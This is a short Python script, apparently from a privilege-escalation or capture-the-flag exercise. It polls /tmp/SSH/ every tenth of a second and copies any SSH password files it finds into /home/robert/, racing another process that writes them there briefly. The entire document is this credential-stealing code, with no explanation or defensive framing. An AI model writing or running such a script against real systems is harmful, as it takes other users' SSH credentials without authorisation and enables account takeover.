import os
import time
import shutil

SSH_PASSWORD_FOLDER_PATH = "/tmp/SSH/"

def main():
    while True:
        try:
            list_password_files = os.listdir(SSH_PASSWORD_FOLDER_PATH)
            for password_file in list_password_files:
                shutil.copyfile(
                    "{}{}".format(SSH_PASSWORD_FOLDER_PATH, password_file),
                    "/home/robert/{}".format(password_file),
                )    
            time.sleep(0.1)
        except FileNotFoundError:
            time.sleep(0.05)
            continue

if __name__ == "__main__":
    # execute only if run as a script
    main()